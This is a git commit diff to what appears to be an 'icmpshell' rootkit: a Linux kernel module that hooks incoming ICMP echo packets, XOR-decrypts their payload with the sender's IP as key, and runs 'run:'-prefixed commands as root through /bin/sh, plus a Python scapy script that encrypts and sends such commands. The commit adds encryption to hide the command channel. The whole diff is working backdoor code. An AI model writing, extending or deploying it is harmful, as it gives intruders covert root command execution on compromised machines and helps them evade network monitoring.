10f3f8569566364aee6ef81603992e814de157b7
Oleksandr Krasilia <oleksandr.krasilia@namecheap.com>
2025-07-28 00:12:08 +0300

    Added encruption for icmp pyload

--- main.c
+++ main.c
@@ -2,93 +2,98 @@
 #include <linux/ip.h>
 #include <linux/icmp.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/inet.h> // For in_aton
 
 #define MAX_CMD_LEN 1976 // Maximum command length
 
 static struct nf_hook_ops nfho; // Structure for Netfilter hook registration
 
-char cmd_string[MAX_CMD_LEN]; // Buffer for storing the command
+char exec_cmd_buffer[MAX_CMD_LEN]; // Buffer for storing the command
 
-struct work_struct my_work; // Structure for deferred work
+// Simple XOR decryption for kernel
+static void simple_xor_decrypt(char *out_buf, const unsigned char *in_buf, int data_len, __be32 xor_key) {
+    unsigned char *key_bytes = (unsigned char *)&xor_key;
+    int idx;
+    for (idx = 0; idx < data_len; ++idx) {
+        out_buf[idx] = in_buf[idx] ^ key_bytes[idx % 4];
+    }
+    out_buf[data_len] = '\0';
+}
 
-// Deferred work handler, executes the command from cmd_string
-static void work_handler(struct work_struct * work) 
+// Deferred work handler, executes the command from exec_cmd_buffer
+static void exec_work_handler(struct work_struct *work) 
 {
-  static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL}; // Arguments for shell execution
+  static char *argv[] = {"/bin/sh", "-c", exec_cmd_buffer, NULL}; // Arguments for shell execution
   static char *envp[] = {"PATH=/bin:/sbin", NULL}; // Environment
 
   call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); // Run command in usermode
 }
 
-DECLARE_WORK(my_work, work_handler); // Macro for declaring deferred work
+DECLARE_WORK(exec_work, exec_work_handler); // Macro for declaring deferred work
+
+char exec_cmd_buffer[MAX_CMD_LEN]; // Buffer for storing the command
 
 // Main function for intercepting ICMP packets
-static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+static unsigned int icmp_command_interceptor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
-  struct iphdr *iph;
-  struct icmphdr *icmph;
+    struct iphdr *iph;
+    struct icmphdr *icmph;
+    unsigned char *payload_ptr;
+    unsigned char *payload_end;
+    int idx = 0;
+    int decrypted_len;
+    __be32 decrypt_key;
 
-  unsigned char *user_data;
-  unsigned char *tail;
-  unsigned char *i;
-  int j = 0;
+    iph = ip_hdr(skb);
+    icmph = icmp_hdr(skb);
 
-  iph = ip_hdr(skb); // Get IP header
-  icmph = icmp_hdr(skb); // Get ICMP header
-
-  // Check if this is an ICMP packet
-  if (iph->protocol != IPPROTO_ICMP) {
-    return NF_ACCEPT;
-  }
-  // Check if this is an ICMP Echo (ping)
-  if (icmph->type != ICMP_ECHO) {
-    return NF_ACCEPT;
-  }
-
-  // Extract user data from the packet
-  user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
-  tail = skb_tail_pointer(skb);
-
-  j = 0;
-  // Copy data from the packet to cmd_string
-  for (i = user_data; i != tail; ++i) {
-    char c = *(char *)i;
-
-    cmd_string[j] = c;
-
-    j++;
-
-    if (c == '\0')
-      break;
-
-    if (j == MAX_CMD_LEN) {
-      cmd_string[j] = '\0';
-      break;
+    // Check if this is an ICMP packet
+    if (iph->protocol != IPPROTO_ICMP) {
+        return NF_ACCEPT;
+    }
+    // Check if this is an ICMP Echo (ping)
+    if (icmph->type != ICMP_ECHO) {
+        return NF_ACCEPT;
     }
 
-  }
+    // Extract user data from the packet
+    payload_ptr = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
+    payload_end = skb_tail_pointer(skb);
+    decrypted_len = payload_end - payload_ptr;
+    printk(KERN_INFO "[icmpshell] Payload length: %d\n", decrypted_len);
 
-  // Check if the command starts with "run:"
-  if (strncmp(cmd_string, "run:", 4) != 0) {
-    return NF_ACCEPT;
-  } else {
-    // Shift the string to remove "run:"
-    for (j = 0; j <= sizeof(cmd_string)/sizeof(cmd_string[0])-4; j++) {
-      cmd_string[j] = cmd_string[j+4];
-      if (cmd_string[j] == '\0')
-        break;
+    // Use source IP as key by default
+    decrypt_key = iph->saddr;
+    printk(KERN_INFO "[icmpshell] Using key: %pI4\n", &decrypt_key);
+
+    // Decrypt payload
+    simple_xor_decrypt(exec_cmd_buffer, payload_ptr, decrypted_len, decrypt_key);
+    printk(KERN_INFO "[icmpshell] Decrypted payload: %s\n", exec_cmd_buffer);
+
+    // Check if the command starts with "run:"
+    if (strncmp(exec_cmd_buffer, "run:", 4) != 0) {
+        printk(KERN_INFO "[icmpshell] No 'run:' prefix, skipping\n");
+        return NF_ACCEPT;
+    } else {
+        // Shift the string to remove "run:"
+        for (idx = 0; idx <= sizeof(exec_cmd_buffer)/sizeof(exec_cmd_buffer[0])-4; idx++) {
+            exec_cmd_buffer[idx] = exec_cmd_buffer[idx+4];
+            if (exec_cmd_buffer[idx] == '\0')
+                break;
+        }
+        printk(KERN_INFO "[icmpshell] Command to execute: %s\n", exec_cmd_buffer);
     }
-  }
 
-  schedule_work(&my_work); // Schedule deferred work
+    schedule_work(&exec_work); // Schedule deferred work
+    printk(KERN_INFO "[icmpshell] Scheduled work for command\n");
 
-  return NF_ACCEPT;
+    return NF_ACCEPT;
 }
 
 // Module initialization function
 static int __init startup(void)
 {
-  nfho.hook = icmp_cmd_executor; // Set the handler
+  nfho.hook = icmp_command_interceptor; // Set the handler
   nfho.hooknum = NF_INET_PRE_ROUTING; // Intercept before routing
   nfho.pf = PF_INET;
   nfho.priority = NF_IP_PRI_FIRST;
--- send.py
+++ send.py
@@ -1,12 +1,53 @@
-#!/usr/bin/env python3
-
 import sys
+import socket
+import struct
+import requests
 from scapy.all import sr1, IP, ICMP
 
+def get_local_ip(dst_ip):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((dst_ip, 1))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = '127.0.0.1'
+    finally:
+        s.close()
+    return ip
+
+def get_external_ip():
+    try:
+        return requests.get('https://api.ipify.org').text
+    except Exception:
+        return None
+
+def ip_to_key(ip):
+    return struct.unpack('!I', socket.inet_aton(ip))[0]
+
+def xor_encrypt(data, key):
+    key_bytes = struct.pack('!I', key)
+    return bytes([b ^ key_bytes[i % 4] for i, b in enumerate(data.encode())])
+
 if len(sys.argv) < 3:
-    print('Usage: {} IP "command"'.format(sys.argv[0]))
+    print('Usage: {} IP "command" [--nat|-n]'.format(sys.argv[0]))
     exit(0)
 
-p = sr1(IP(dst=sys.argv[1])/ICMP()/"run:{}".format(sys.argv[2]))
+dst_ip = sys.argv[1]
+command = sys.argv[2]
+use_nat = '--nat' in sys.argv or '-n' in sys.argv
+
+if use_nat:
+    ext_ip = get_external_ip()
+    if not ext_ip:
+        print("Can't get external IP")
+        exit(1)
+    key_ip = ext_ip
+else:
+    key_ip = get_local_ip(dst_ip)
+
+key = ip_to_key(key_ip)
+enc = xor_encrypt("run:" + command, key)
+
+p = sr1(IP(dst=dst_ip)/ICMP()/enc)
 if p:
     p.show()
